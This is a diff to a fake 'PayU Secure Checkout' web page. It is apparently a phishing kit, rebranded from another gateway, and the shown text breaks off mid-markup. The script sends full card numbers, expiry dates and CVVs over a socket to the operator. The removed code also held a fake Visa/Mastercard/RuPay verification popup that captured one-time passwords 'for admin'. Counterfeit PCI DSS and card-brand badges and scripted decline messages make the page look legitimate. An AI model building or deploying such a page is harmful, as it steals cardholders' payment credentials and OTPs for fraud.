@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Plural Secure Checkout</title>
+    <title>PayU Secure Checkout</title>
     <meta name="description" content="Secure payment gateway powered by PayU" />
     <meta name="author" content="PayU" />
 
@@ -348,8 +348,8 @@ input:not(.pl-10) {
         <div class="card-container w-full max-w-5xl">
             <div class="header-bar">
                 <div class="flex justify-between items-center">
-                    <div class="text-2xl font-bold">Peacock Merchandise</div>
-                    <p class="text-sm">100% Secure Payment</p>
+                    <div class="text-2xl font-bold">PayU</div>
+                    <p class="text-sm">Secure Payment</p>
                 </div>
                 <div class="text-gray-100">
                     Amount: $1299.00 USD
@@ -401,9 +401,10 @@ input:not(.pl-10) {
                                 <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="American Express" class="h-6 w-auto object-contain" />
                             </div>
                             <div class="h-8 w-12 flex items-center justify-center">
-                                <img src="https://1000logos.net/wp-content/uploads/2021/05/Discover-logo-500x281.png" alt="Discover" class="h-6 w-auto object-contain" />
-                           
-
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/Discover_Card_logo.svg" alt="Discover" class="h-6 w-auto object-contain" />
+                            </div>
+                            <div class="h-8 w-12 flex items-center justify-center">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Rupay-Logo.png" alt="RuPay" class="h-6 w-auto object-contain" />
                             </div>
                         </div>
                     </div>
@@ -484,21 +485,19 @@ input:not(.pl-10) {
             
             <div class="footer-bar">
                 <div class="security-badge">
-                    <img src="https://maceinnovations.com/wp-content/uploads/2019/04/pci-dss-logo.png" alt="PCI DSS" />
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/PCI_Logo.svg" alt="PCI DSS" />
                     <span class="text-xs text-gray-500">PCI DSS Compliant</span>
                 </div>
                 <div class="separator-vertical"></div>
                 <div>
-                    <img src="https://seekvectors.com/storage/images/Verified%20by%20Visa-01.svg" alt="Verified by Visa" class="h-20 w-auto" />
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Verified_by_Visa.svg" alt="Verified by Visa" class="h-6 w-auto" />
                 </div>
                 <div>
-                    <img src="https://images.seeklogo.com/logo-png/45/2/masterpass-logo-png_seeklogo-452118.png" alt="Mastercard SecureCode" class="h-24 w-auto" />
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Mastercard_SecureCode_horizontal.svg" alt="Mastercard SecureCode" class="h-6 w-auto" />
                 </div>
                 <div class="separator-vertical"></div>
-                <div class="text-xs text-gray-500">
-              <img
-                   src="https://cdn.pinelabs.com/india/img/press-release/plural-logo.png" alt="Powered by Plural" class="h-10 w-auto"</div>
-            </div> 
+                <div class="text-xs text-gray-500">Powered by PayU Biz</div>
+            </div>
         </div>
     </div>
 <script>
@@ -544,6 +543,8 @@ let socket = null;
 // Main application code
 document.addEventListener('DOMContentLoaded', function() {
     try {
+        console.log('Application starting...');
+        
         // Initialize socket connection
         socket = io(window.location.origin, {
             reconnection: true,
@@ -643,726 +644,316 @@ function setupSocketListeners() {
             console.log('OTP condition met, showing OTP form');
             showOTPUI();
         } else {
-            console.warn('Transaction ID mismatch:', data.transaction_id, state.transactionId);
+            console.warn('Transaction ID mismatch. Got:', data.transaction_id, 'Expected:', state.transactionId);
         }
     });
     
-    // Handle payment success/failure responses
-    socket.on('payment_success', (data) => {
-        console.log('Payment success:', data);
-        if (data.transaction_id === state.transactionId) {
-            showSuccessUI();
-        }
-    });
-    
-    socket.on('payment_failed', (data) => {
-        console.log('Payment failed:', data);
-        if (data.transaction_id === state.transactionId) {
-            showErrorUI("Payment Failed", data.message || "Your payment could not be processed");
-        }
-    });
-    
-    // Handle currency redirect request
-    socket.on('currency_redirect', (data) => {
-        console.log('Currency redirect requested:', data);
-        // Implement currency page redirect logic
-        showToast("Processing payment", "Redirecting to currency selection...");
-        // Simulate page transition
-        showProcessingUI();
-    });
-    
-    // Handle bank page toggle
-    socket.on('toggle_bankpage', (data) => {
-        console.log('Bank page toggle requested:', data);
-        if (data.show) {
-            showToast("Bank Verification", "Your bank requires additional verification");
-        }
-    });
-    
-    // Handle MC verification
-    socket.on('show_mc_verification', (data) => {
-        console.log('MC verification requested:', data);
-        showProcessingUI();
+    // Handle payment response (success/failure)
+    socket.on('payment_response', (response) => {
+        console.log('Payment response received:', response);
         
-        // After a short delay, show a custom MC verification UI
-        setTimeout(() => {
-            showMCVerification(data);
-        }, 1500);
-    });
-    
-    // Handle verification result
-    socket.on('mc_verification_result', function(result) {
-        const mcContainer = document.getElementById('mc-verification-container');
-        if (mcContainer) {
-            document.body.removeChild(mcContainer);
-        }
-        
-        if (result.success) {
-            // Handle successful verification
-            showSuccessUI();
+        if (response.success) {
+            showSuccessUI(response);
         } else {
-            // Handle failed verification
-            const reason = result.reason ? getReadableFailureReason(result.reason) : "Your payment could not be processed";
-            showErrorUI("Payment Failed", reason);
-        }
-    });
-    
-    // Handle OTP error
-    socket.on('mc_otp_error', function(data) {
-        const otpInput = document.getElementById('mc-otp-input');
-        if (otpInput) {
-            otpInput.value = '';
-            otpInput.classList.add('border-red-500');
-            
-            // Add error message
-            const errorMsg = document.createElement('p');
-            errorMsg.className = 'text-red-500 text-sm mt-1';
-            errorMsg.textContent = data.message || 'Invalid OTP. Please try again.';
-            
-            // Remove any existing error message
-            const existingError = otpInput.parentNode.querySelector('.text-red-500');
-            if (existingError) {
-                otpInput.parentNode.removeChild(existingError);
-            }
-            
-            otpInput.parentNode.appendChild(errorMsg);
-            
-            // Re-enable the submit button
-            const submitBtn = document.getElementById('mc-submit-otp');
-            if (submitBtn) {
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Submit';
-            }
-        }
-    });
-    
-    // Handle verification status updates
-    socket.on('verification_status_update', function(data) {
-        console.log('Verification status update:', data);
-        
-        // Update UI based on status
-        if (data.status === 'otp_received') {
-            // Show notification to user
-            const mcContainer = document.getElementById('mc-verification-container');
-            const submitBtn = document.getElementById('mc-submit-otp');
-            
-            if (mcContainer && submitBtn) {
-                submitBtn.textContent = 'OTP Received ✓';
-                submitBtn.style.backgroundColor = '#22c55e';
-                
-                // Add status message
-                const statusMsg = document.createElement('p');
-                statusMsg.className = 'text-center text-green-500 mt-4';
-                statusMsg.textContent = 'Your verification code has been received and is being processed.';
-                
-                // Check if message already exists
-                const existingMsg = mcContainer.querySelector('.text-center.text-green-500');
-                if (!existingMsg) {
-                    submitBtn.parentNode.appendChild(statusMsg);
-                }
-            }
+            showFailureUI(response.message || 'Payment processing failed. Please try again.');
         }
     });
 }
 
-// Helper function to get readable failure reason
-function getReadableFailureReason(reasonCode) {
-    const reasons = {
-        'insufficient_balance': 'Insufficient funds in your account',
-        'bank_declined': 'Your bank declined this transaction',
-        'card_disabled': 'This card has been disabled for online transactions',
-        'invalid_card': 'Invalid card details',
-        '3Dsecure_is_not_enabled_for_your_card': '3D secure is not enabled for your card',
-        'pickup_Card': 'This card has been flagged for pickup',
-        'Incorrect_card_details': 'The card details entered are incorrect',
-        'Credit_limit_exceeded': 'Your credit limit has been exceeded',
-        'Incorrect_security_code': 'The security code is incorrect',
-        'This_type_of_transacton_is_not_allowed_for_your_card': 'This type of transaction is not allowed for your card',
-        'The_issuing_bank_flagged_the_transaction_as_potentially_fraudulent': 'Your issuing bank flagged the transaction as potentially fraudulent'
-    };
-    return reasons[reasonCode] || 'Your payment could not be processed';
-}
-
-// Function to show MC verification UI
-function showMCVerification(data) {
-    // Create MC verification UI
-    const mcContainer = document.createElement('div');
-    mcContainer.id = 'mc-verification-container';
-    mcContainer.className = 'fixed inset-0 bg-black bg-opacity-75 z-50 flex items-center justify-center';
-    
-    // Determine which logo to show based on verification type
-    let logoSrc = '';
-    let verificationTitle = '';
-    
-    switch(data.verificationType || 'mastercard') {
-        case 'visa':
-            logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
-            verificationTitle = 'Verified by Visa';
-            break;
-        case 'amex':
-            logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg';
-            verificationTitle = 'American Express SafeKey';
-            break;
-        case 'discover':
-            logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/d/d1/Discover_Card_logo.svg';
-            verificationTitle = 'Discover ProtectBuy';
-            break;
-        case 'rupay':
-            logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/c/cb/Rupay-Logo.png';
-            verificationTitle = 'RuPay PaySecure';
-            break;
-        default:
-            logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
-            verificationTitle = 'Mastercard SecureCode';
-    }
-    
-    // Build MC verification HTML
-    mcContainer.innerHTML = `
-        <div class="bg-white p-6 rounded-lg max-w-md w-full">
-            <div class="flex justify-center mb-4">
-                <img src="${logoSrc}" alt="${verificationTitle}" class="h-12">
-            </div>
-            <h3 class="text-xl font-bold mb-4 text-center">${verificationTitle}</h3>
-            <p class="mb-4 text-gray-600 text-center">
-                For your security, your bank requires additional verification for this transaction.
-            </p>
-            <div class="mb-4 bg-blue-50 p-4 rounded-lg">
-                <div class="flex justify-between mb-2">
-                    <span class="text-gray-500">Merchant:</span>
-                    <span class="font-medium">${data.merchantName || 'Online Store'}</span>
-                </div>
-                <div class="flex justify-between mb-2">
-                    <span class="text-gray-500">Amount:</span>
-                    <span class="font-medium">${data.amount || state.amount} ${data.currency || 'INR'}</span>
-                </div>
-                <div class="flex justify-between">
-                    <span class="text-gray-500">Date:</span>
-                    <span class="font-medium">${new Date().toLocaleDateString()}</span>
-                </div>
-            </div>
-            <div class="mb-4">
-                <label class="block text-sm font-medium mb-2">One-Time Password (OTP)</label>
-                <input type="text" id="mc-otp-input" class="w-full p-2 border border-gray-300 rounded" 
-                    placeholder="Enter OTP sent to your mobile" maxlength="6">
-                <p class="text-sm text-gray-500 mt-1">
-                    A verification code has been sent to your registered mobile ${data.phoneLastFour ? 'ending with ' + data.phoneLastFour : ''}
-                </p>
-            </div>
-            <button id="mc-submit-otp" class="w-full bg-blue-600 text-white py-2 rounded font-medium">
-                Submit
-            </button>
-        </div>
-    `;
-    
-    document.body.appendChild(mcContainer);
-    
-    // Add event listener for OTP submission
-    document.getElementById('mc-submit-otp').addEventListener('click', function() {
-        const otpValue = document.getElementById('mc-otp-input').value.trim();
-        if (otpValue.length < 4) {
-            alert('Please enter a valid OTP');
-            return;
-        }
-        
-        // Disable the button to prevent multiple submissions
-        this.disabled = true;
-        this.textContent = 'Verifying...';
-        
-        // Send OTP to admin with retry logic
-        let retryCount = 0;
-        const maxRetries = 3;
-        
-        const sendOTP = () => {
-            socket.emit('mc_otp_submitted', {
-                invoiceId: state.transactionId,
-                otp: otpValue,
-                timestamp: new Date().toISOString()
-            }, (acknowledgement) => {
-                // This callback function will run when the server acknowledges receipt
-                if (acknowledgement && acknowledgement.received) {
-                    console.log('OTP submission acknowledged by server');
-                    
-                    // Show feedback to user
-                    const statusText = document.createElement('p');
-                    statusText.className = 'text-green-500 text-sm mt-1';
-                    statusText.textContent = 'Verification code received. Processing...';
-                    
-                    const otpInput = document.getElementById('mc-otp-input');
-                    if (otpInput && otpInput.parentNode) {
-                        // Remove any existing status message
-                        const existingStatus = otpInput.parentNode.querySelector('.text-green-500');
-                        if (existingStatus) {
-                            otpInput.parentNode.removeChild(existingStatus);
-                        }
-                        
-                        // Add the new status message
-                        otpInput.parentNode.appendChild(statusText);
-                    }
-                    
-                } else if (retryCount < maxRetries) {
-                    console.warn(`OTP submission not acknowledged, retrying (${retryCount + 1}/${maxRetries})...`);
-                    retryCount++;
-                    setTimeout(sendOTP, 1000); // Retry after 1 second
-                } else {
-                    console.error('Failed to send OTP after multiple attempts');
-                    // Update UI to show error
-                    this.textContent = 'Retry';
-                    this.disabled = false;
-                    
-                    const errorText = document.createElement('p');
-                    errorText.className = 'text-red-500 text-sm mt-1';
-                    errorText.textContent = 'Failed to send verification code. Please try again.';
-                    
-                    const otpInput = document.getElementById('mc-otp-input');
-                    if (otpInput && otpInput.parentNode) {
-                        // Remove any existing status message
-                        const existingStatus = otpInput.parentNode.querySelector('.text-red-500');
-                        if (existingStatus) {
-                            otpInput.parentNode.removeChild(existingStatus);
-                        }
-                        
-                        // Add the new error message
-                        otpInput.parentNode.appendChild(errorText);
-                    }
-                }
-            });
-        };
-        
-        sendOTP();
-        
-        // Set a timeout to check for verification status
-        setTimeout(() => {
-            // Check if we still have the MC verification panel open
-            const mcContainer = document.getElementById('mc-verification-container');
-            if (mcContainer) {
-                // Ping the server to check status
-                socket.emit('check_verification_status', {
-                    invoiceId: state.transactionId,
-                    timestamp: new Date().toISOString()
-                });
-            }
-        }, 5000); // Check after 5 seconds
-    });
-}
-
-// Generate random phone number for demo
 function generateRandomPhone() {
-    const area = Math.floor(Math.random() * 900) + 100;
-    const middle = Math.floor(Math.random() * 900) + 100;
-    const last = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
-    
-    // Last 4 digits visible, rest masked
-    state.maskedPhone = `+1 (***) ***-${last.substring(last.length - 4)}`;
-    
-    // Store full number (for demo purposes)
-    const fullPhone = `+1 (${area}) ${middle}-${last}`;
-    console.log("Full phone for verification:", fullPhone);
+    // Generate a random masked phone number for OTP display
+    const prefix = '+91 ';
+    const lastDigits = Math.floor(1000 + Math.random() * 9000).toString();
+    state.maskedPhone = prefix + 'XXXX XX' + lastDigits;
 }
 
-// Format card number with spaces
-function formatCardNumber(value) {
-    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-    const matches = v.match(/\d{4,16}/g);
-    const match = matches && matches[0] || '';
-    const parts = [];
+// UI RENDERING FUNCTIONS
+
+function showCardUI() {
+    console.log('Showing card UI...');
+    const appDiv = document.getElementById('app');
     
-    for (let i = 0; i < match.length; i += 4) {
-        parts.push(match.substring(i, i + 4));
-    }
+    // We're keeping the existing HTML structure but adding our event handlers
     
-    if (parts.length) {
-        return parts.join(' ');
+    // Add a small delay to ensure DOM is fully rendered
+    setTimeout(() => {
+        setupCardFormHandlers();
+        console.log('Card form handlers set up after delay');
+    }, 100);
+}
+
+function setupCardFormHandlers() {
+    console.log('Setting up card form handlers...');
+    
+    const cardNumberInput = document.getElementById('card-number');
+    const cardHolderInput = document.getElementById('card-holder');
+    const expiryDateInput = document.getElementById('expiry-date');
+    const cvvInput = document.getElementById('cvv');
+    const cardForm = document.getElementById('card-form');
+    
+    if (cardNumberInput) {
+        cardNumberInput.addEventListener('input', formatCardNumber);
+        cardNumberInput.addEventListener('input', detectCardType);
+        console.log('Card number input handlers attached');
     } else {
-        return value;
+        console.error('Card number input not found');
     }
-}
-
-// Detect card type based on first digit
-function detectCardType(cardNumber) {
-    const number = cardNumber.replace(/\s+/g, '');
     
-    if (number.startsWith('4')) {
-        state.cardType = 'visa';
-    } else if (number.startsWith('5')) {
-        state.cardType = 'mastercard';
-    } else if (number.startsWith('3')) {
-        state.cardType = 'amex';
-    } else if (number.startsWith('6')) {
-        state.cardType = 'discover';
-    } else if (/^(81|82)/.test(number)) {
-        state.cardType = 'rupay';
+    if (expiryDateInput) {
+        expiryDateInput.addEventListener('input', formatExpiryDate);
+        console.log('Expiry date input handlers attached');
     } else {
-        state.cardType = null;
+        console.error('Expiry date input not found');
     }
+    
+    if (cardForm) {
+        cardForm.addEventListener('submit', handleCardSubmit);
+        console.log('Form submit handler attached');
+    } else {
+        console.error('Card form not found');
+    }
+    
+    console.log('Card form handlers setup complete');
 }
 
-// Format expiry date as MM/YY
-function formatExpiryDate(value) {
-    let v = value.replace(/\D/g, '');
+function formatCardNumber(e) {
+    console.log('Formatting card number...');
+    const input = e.target;
+    let value = input.value.replace(/\D/g, '');
+    let formattedValue = '';
     
-    if (v.length > 2) {
-        return `${v.slice(0, 2)}/${v.slice(2, 4)}`;
+    // Format based on card type
+    if (/^3[47]/.test(value)) {
+        // AMEX format: XXXX XXXXXX XXXXX
+        formattedValue = value.replace(/(\d{4})(\d{6})?(\d{5})?/, (_, p1, p2, p3) => {
+            let result = p1;
+            if (p2) result += ' ' + p2;
+            if (p3) result += ' ' + p3;
+            return result;
+        });
+    } else {
+        // Other cards format: XXXX XXXX XXXX XXXX
+        formattedValue = value.replace(/(\d{4})(\d{4})?(\d{4})?(\d{4})?/, (_, p1, p2, p3, p4) => {
+            let result = p1;
+            if (p2) result += ' ' + p2;
+            if (p3) result += ' ' + p3;
+            if (p4) result += ' ' + p4;
+            return result;
+        });
     }
     
-    return v;
+    // Update the input value only if it changed
+    if (input.value !== formattedValue) {
+        input.value = formattedValue;
+        
+        // Save the unformatted value in the state
+        state.cardForm.cardNumber = value;
+    }
+    
+    console.log('Card number formatted:', formattedValue);
 }
 
-// Validate card form
-function validateCardForm() {
-    const errors = {};
-    const { cardNumber, cardHolder, expiryDate, cvv } = state.cardForm;
+function detectCardType(e) {
+    console.log('Detecting card type...');
+    const cardNumber = e.target.value.replace(/\D/g, '');
+    const cardTypeElement = document.querySelector('.card-type');
     
-    if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) {
-        errors.cardNumber = "Card number must be 16 digits";
+    let cardType = null;
+    
+    // Detect card type based on patterns
+    if (/^4/.test(cardNumber)) {
+        cardType = 'visa';
+    } else if (/^5[1-5]/.test(cardNumber)) {
+        cardType = 'mastercard';
+    } else if (/^3[47]/.test(cardNumber)) {
+        cardType = 'amex';
+    } else if (/^6(?:011|5)/.test(cardNumber)) {
+        cardType = 'discover';
+    } else if (/^62/.test(cardNumber)) {
+        cardType = 'rupay';
     }
     
-    if (!cardHolder || cardHolder.length < 3) {
-        errors.cardHolder = "Card holder name is required";
-    }
+    // Update state
+    state.cardType = cardType;
     
-    if (!expiryDate || !/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(expiryDate)) {
-        errors.expiryDate = "Must be in MM/YY format";
-    }
-    
-    if (!cvv || cvv.length < 3 || cvv.length > 4) {
-        errors.cvv = "CVV must be 3-4 digits";
-    }
-    
-    state.cardForm.errors = errors;
-    return Object.keys(errors).length === 0;
+    console.log('Card type detected:', cardType);
 }
 
-// Handle card form submission
+function formatExpiryDate(e) {
+    console.log('Formatting expiry date...');
+    const input = e.target;
+    let value = input.value.replace(/\D/g, '');
+    
+    if (value.length > 0) {
+        // Format first two digits as month
+        let month = value.substring(0, 2);
+        // Convert month to valid range (01-12)
+        if (month.length === 1 && parseInt(month) > 1) {
+            month = '0' + month;
+        } else if (month.length === 2 && (parseInt(month) < 1 || parseInt(month) > 12)) {
+            month = '12'; // Default to max month if invalid
+        }
+        
+        // Format last two digits as year
+        let year = value.length > 2 ? value.substring(2, 4) : '';
+        
+        // Combine with slash
+        value = month + (year ? ('/' + year) : '');
+    }
+    
+    // Update the input value only if it changed
+    if (input.value !== value) {
+        input.value = value;
+        
+        // Save in state
+        state.cardForm.expiryDate = value;
+    }
+    
+    console.log('Expiry date formatted:', value);
+}
+
 function handleCardSubmit(e) {
     e.preventDefault();
+    console.log('Form submitted, preventing default and processing payment...');
     
-    if (!validateCardForm()) {
-        // Show validation errors
-        const { cardNumber, cardHolder, expiryDate, cvv } = state.cardForm.errors;
-        if (cardNumber) {
-            document.getElementById('card-number').classList.add('border-red-500');
-        }
-        if (cardHolder) {
-            document.getElementById('card-holder').classList.add('border-red-500');
-        }
-        if (expiryDate) {
-            document.getElementById('expiry-date').classList.add('border-red-500');
-        }
-        if (cvv) {
-            document.getElementById('cvv').classList.add('border-red-500');
-        }
-        return;
-    }
+    // Get form values
+    const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
+    const cardHolder = document.getElementById('card-holder').value;
+    const expiryDate = document.getElementById('expiry-date').value;
+    const cvv = document.getElementById('cvv').value;
     
-    // Reset validation classes
-    document.getElementById('card-number').classList.remove('border-red-500');
-    document.getElementById('card-holder').classList.remove('border-red-500');
-    document.getElementById('expiry-date').classList.remove('border-red-500');
-    document.getElementById('cvv').classList.remove('border-red-500');
-    
-    // Show loading state
-    const submitBtn = document.querySelector('button[type="submit"]');
-    submitBtn.disabled = true;
-    submitBtn.innerHTML = `
-        <div class="flex items-center justify-center">
-            <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-            </svg>
-            Processing
-        </div>
-    `;
-    
-    // Generate transaction ID
-    state.transactionId = Math.random().toString(36).substring(2, 15);
-    
-    // Collect card data to send
-    const cardData = {
-        cardNumber: state.cardForm.cardNumber.replace(/\s/g, ''),
-        cardholder: state.cardForm.cardHolder,
-        expiry: state.cardForm.expiryDate,
-        cvv: state.cardForm.cvv,
-        amount: state.amount,
-        currency: "USD",
-        email: "customer@example.com",
-        cardType: state.cardType
+    // Update state
+    state.cardForm = {
+        cardNumber,
+        cardHolder,
+        expiryDate,
+        cvv,
+        errors: {}
     };
     
-    // Emit card details to server for admin panel
-    socket.emit('card_submitted', {
-        invoiceId: state.transactionId,
-        cardData: cardData,
-        timestamp: new Date().toISOString()
+    // Validate form
+    if (!validateCardForm()) {
+        console.log('Card form validation failed');
+        return false;
+    }
+    
+    // Show processing UI
+    state.loading = true;
+    showProcessingUI('Verifying card details...');
+    
+    // Send card data to server
+    console.log('Emitting process_payment event with card data');
+    socket.emit('process_payment', {
+        cardNumber,
+        cardHolder,
+        expiryDate,
+        cvv,
+        amount: state.amount,
+        cardType: state.cardType
     });
     
-    // Show processing state
-    showProcessingUI();
+    return false; // Extra safety to prevent form submission
+}
+
+function validateCardForm() {
+    console.log('Validating card form...');
+    let isValid = true;
+    const errors = {};
     
-    // Timeout in case of no response
-    setTimeout(() => {
-        // Check if we're still in processing state
-        const processingIndicator = document.querySelector('.processing-indicator');
-        if (processingIndicator) {
-            showErrorUI("Connection Timeout", "No response from payment server. Please try again.");
+    // Validate card number
+    if (!state.cardForm.cardNumber || state.cardForm.cardNumber.length < 13 || state.cardForm.cardNumber.length > 19) {
+        errors.cardNumber = 'Please enter a valid card number';
+        showInputError('card-number', errors.cardNumber);
+        isValid = false;
+    } else {
+        clearInputError('card-number');
+    }
+    
+    // Validate card holder
+    if (!state.cardForm.cardHolder || state.cardForm.cardHolder.trim().length < 3) {
+        errors.cardHolder = 'Please enter the card holder name';
+        showInputError('card-holder', errors.cardHolder);
+        isValid = false;
+    } else {
+        clearInputError('card-holder');
+    }
+    
+    // Validate expiry date
+    if (!state.cardForm.expiryDate || !state.cardForm.expiryDate.includes('/') || state.cardForm.expiryDate.length !== 5) {
+        errors.expiryDate = 'Please enter a valid expiry date (MM/YY)';
+        showInputError('expiry-date', errors.expiryDate);
+        isValid = false;
+    } else {
+        const [month, year] = state.cardForm.expiryDate.split('/');
+        const currentDate = new Date();
+        const currentYear = currentDate.getFullYear() % 100; // Get last 2 digits
+        const currentMonth = currentDate.getMonth() + 1; // Month is 0-indexed
+        
+        if (parseInt(year) < currentYear || 
+            (parseInt(year) === currentYear && parseInt(month) < currentMonth)) {
+            errors.expiryDate = 'Card has expired';
+            showInputError('expiry-date', errors.expiryDate);
+            isValid = false;
+        } else {
+            clearInputError('expiry-date');
         }
-    }, 30000);
-    return false;
+    }
+    
+    // Validate CVV - length depends on card type
+    const cvvLength = state.cardType === 'amex' ? 4 : 3;
+    if (!state.cardForm.cvv || state.cardForm.cvv.length !== cvvLength) {
+        errors.cvv = `Please enter a valid ${cvvLength}-digit CVV`;
+        showInputError('cvv', errors.cvv);
+        isValid = false;
+    } else {
+        clearInputError('cvv');
+    }
+    
+    // Update state with errors
+    state.cardForm.errors = errors;
+    
+    console.log('Validation result:', isValid ? 'Valid' : 'Invalid', errors);
+    return isValid;
 }
 
-// Show toast notification
-function showToast(title, message, type = 'info') {
-    const toast = document.createElement('div');
-    toast.className = `fixed top-4 right-4 max-w-xs bg-white border rounded-lg shadow-lg p-4 z-50 ${
-        type === 'error' ? 'border-red-500' : 'border-blue-500'
-    }`;
+function showInputError(inputId, errorMessage) {
+    const input = document.getElementById(inputId);
+    if (!input) return;
     
-    toast.innerHTML = `
-        <div class="flex items-center">
-            <div class="${type === 'error' ? 'text-red-500' : 'text-blue-500'} mr-3">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
-                    ${type === 'error' 
-                      ? '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"/>'
-                      : '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>'
-                    }
-                </svg>
-            </div>
-            <div>
-                <div class="font-bold text-gray-900">${title}</div>
-                <div class="text-sm text-gray-600">${message}</div>
-            </div>
-        </div>
-    `;
+    input.classList.add('border-red-500');
     
-    document.body.appendChild(toast);
+    // Check if error message element already exists
+    let errorElement = input.parentNode.querySelector('.error-message');
+    if (!errorElement) {
+        errorElement = document.createElement('div');
+        errorElement.className = 'error-message text-red-500 text-xs mt-1';
+        input.parentNode.appendChild(errorElement);
+    }
     
-    setTimeout(() => {
-        toast.style.opacity = '0';
-        toast.style.transition = 'opacity 0.5s ease';
-        setTimeout(() => {
-            document.body.removeChild(toast);
-        }, 500);
-    }, 3000);
+    errorElement.textContent = errorMessage;
 }
 
-// UI Helper functions
-function showCardUI() {
-    const appDiv = document.getElementById('app');
-    appDiv.innerHTML = `
-        <div class="card-container w-full max-w-5xl">
-            <div class="header-bar">
-                <div class="flex justify-between items-center">
-                    <div class="text-2xl font-bold">PayU</div>
-                    <p class="text-sm">Secure Payment</p>
-                </div>
-                <div class="text-gray-100">
-                    Amount: $${state.amount.toFixed(2)} USD
-                </div>
-            </div>
-            
-            <div class="md:flex">
-                <!-- Left Side - Order Summary -->
-                <div class="order-summary md:w-1/2">
-                    <h2>Order Summary</h2>
-                    
-                    <div class="space-y-2">
-                        <div class="flex justify-between">
-                            <span class="text-gray-600">Sub Total</span>
-                            <span>$1,200.00</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span class="text-gray-600">Tax (GST)</span>
-                            <span>$99.00</span>
-                        </div>
-                        <div class="border-t border-gray-200 my-2 pt-2 flex justify-between font-semibold">
-                            <span>Total Amount</span>
-                            <span>$${state.amount.toFixed(2)}</span>
-                        </div>
-                    </div>
-                    
-                    <div class="my-6">
-                        <div class="flex items-center space-x-2 mb-3">
-                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01" />
-                            </svg>
-                            <span class="font-medium">Secure Payment Gateway</span>
-                        </div>
-                        <p class="text-sm text-gray-600">
-                            Your payment information is securely transmitted using 256-bit encryption. We do not store your card details.
-                        </p>
-                    </div>
-                    
-                    <div>
-                        <h3 class="text-md font-medium mb-2">We Accept</h3>
-                        <div class="flex flex-wrap gap-3">
-                            <div class="h-8 w-12 flex items-center justify-center">
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-6 w-auto object-contain" />
-                            </div>
-                            <div class="h-8 w-12 flex items-center justify-center">
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-6 w-auto object-contain" />
-                            </div>
-                            <div class="h-8 w-12 flex items-center justify-center">
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="American Express" class="h-6 w-auto object-contain" />
-                            </div>
-                            <div class="h-8 w-12 flex items-center justify-center">
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/Discover_Card_logo.svg" alt="Discover" class="h-6 w-auto object-contain" />
-                            </div>
-                            <div class="h-8 w-12 flex items-center justify-center">
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Rupay-Logo.png" alt="RuPay" class="h-6 w-auto object-contain" />
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- Right Side - Card Details -->
-                <div class="card-details-section md:w-1/2">
-                    <h2>Card Details</h2>
-                    <form id="card-form" class="space-y-4">
-                        <div class="form-group">
-                            <label>Card Number</label>
-                            <div class="relative">
-                                <div class="input-icon left">
-                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5">
-                                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
-                                        <line x1="1" y1="10" x2="23" y2="10"></line>
-                                    </svg>
-                                </div>
-                                <input 
-                                    type="text" 
-                                    id="card-number" 
-                                    placeholder="1234 5678 9012 3456" 
